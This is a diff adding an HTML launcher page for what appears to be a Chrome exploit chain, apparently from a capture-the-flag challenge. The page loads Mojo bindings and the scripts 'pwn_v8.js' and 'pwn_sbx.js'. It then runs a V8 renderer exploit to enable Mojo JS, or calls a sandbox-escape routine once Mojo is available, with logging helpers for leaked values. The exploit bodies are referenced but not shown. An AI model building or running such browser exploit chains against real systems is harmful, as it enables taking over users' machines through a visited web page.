@@ -1,0 +1,36 @@
+<html>
+<script src="./mojo_bindings/mojo_bindings.js"></script>
+<script src="./mojo_bindings/third_party/blink/public/mojom/sandbox/sandbox.mojom.js"></script>
+<pre id='log'></pre>
+<script>
+    function print(string) {
+        var log = document.getElementById('log');
+        if (log) {
+            log.innerText += string + '\n';
+        }
+    }
+    function hex(i) {
+        start = "";
+        content = i.toString(16);
+        if (i < 0) {
+            start += "-";
+            content = content.substring(1);
+        }
+        return start + "0x" + content;
+    }
+</script>
+
+<script src="./pwn_v8.js"></script>
+<script src="./pwn_sbx.js"></script>
+<script>
+    if (typeof (Mojo) !== "undefined") {
+        // Mojo JS enabled, attack sandbox
+        pwn_sbx();
+    } else {
+        // Mojo JS not enabled, enable first
+        pwn_v8();
+    }
+</script>
+
+</html>
+
